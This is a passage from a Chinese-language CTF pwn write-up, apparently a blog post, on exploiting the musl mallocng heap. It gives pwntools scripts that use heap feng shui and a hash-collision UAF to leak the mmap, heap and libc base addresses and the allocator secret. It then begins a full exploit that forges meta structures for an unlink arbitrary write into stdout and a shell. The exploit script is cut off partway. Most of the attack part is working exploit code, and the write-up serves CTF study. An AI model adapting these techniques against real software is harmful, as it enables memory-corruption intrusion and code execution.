class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>这里粘贴<code>sung3r</code>师傅关于<code>group</code>对<code>chunk</code>的管理策略：</p><ul><li><code>chunk</code>按照内存先后，依次分配</li><li><code>free</code>掉的<code>chunk</code>不能马上分配</li><li>需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code></li><li>分配<code>chunk</code>时，会将<code>user data</code>域用<code>\x00</code>初始化</li></ul><p>接下来即可利用堆风水来进行地址的泄露<br>我们首先申请随便申请一个堆块，来防止防止<code>free</code>掉<code>group</code>所有<code>chunk</code>时，将整个<code>group</code>内存归还给堆管理器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>我们来看看此时的<code>group</code>的情况：</p><img src="/2024/01/17/musl/7.png" class="" title="我的图图呢">  <p>可以发现，该存储<code>0x30</code>大小堆块的<code>group</code>最多可以存储<code>7</code>个堆块<br>接下来，除最后一个与第一个<code>chunk</code>，其余全部<code>free</code>掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><img src="/2024/01/17/musl/8.png" class="" title="我的图图呢">  <p>接下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>group的布局为：</p><img src="/2024/01/17/musl/9.png" class="" title="我的图图呢">  <p>再申请一个与’\n’同hash的chunk：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个时候<code>’\n’</code>的哈希链表中就有两个元素，<code>group</code>的布局为：</p><img src="/2024/01/17/musl/10.png" class="" title="我的图图呢">  <p>此时将<code>key</code>为<code>’\n’</code>的堆块删除并将<code>group</code>未被使用的堆块全部<code>free</code>掉:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>由前面的分析可以知道，此时触发的<code>UAF</code>漏洞，被标为<code>UAF</code>的堆块即为<code>’\n’</code>堆块的<code>value</code>区域，我们可以通过将另一个堆块的<code>struct</code>结构体申请到这里，从而通过<code>query</code>函数访问<code>’\n’</code>来泄露出<code>value</code>的地址。此时<code>group</code>的布局为：</p><img src="/2024/01/17/musl/11.png" class="" title="我的图图呢">  <p>最后申请一个堆块泄露地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>group布局为：</p><img src="/2024/01/17/musl/12.png" class="" title="我的图图呢">  <p>同样，我们也能够用相同的策略将<code>libc</code>基地址等内存信息<code>leak</code>出来<br>leak代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br></pre></td></tr></table></figure><p>泄露出地址后，即可通过伪造<code>meta_area、meta、mem</code>来利用<code>unlink</code>，实现任意地址写，此时即可在<code>stdout</code>中写入<code>fake file</code>然后<code>getshell</code><br>即<code>2</code>次<code>free</code>掉自己伪造的<code>group</code>来实现任意地址分配<br>嘶，好像有点说不清，跟着<code>exp</code>一步一步调试即可知道详细原理<code>QWQ</code>，<code>unlink</code>的和<code>fsop</code>的原理上面有讲过(晚点补，如果有机会的话)<br>其实我感觉<code>meta</code>的伪造好像可以当成模板来使用？</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./libc.so&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过dequeue的unlink在stdout-0x10 的地方写入fake_meta_addr</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span 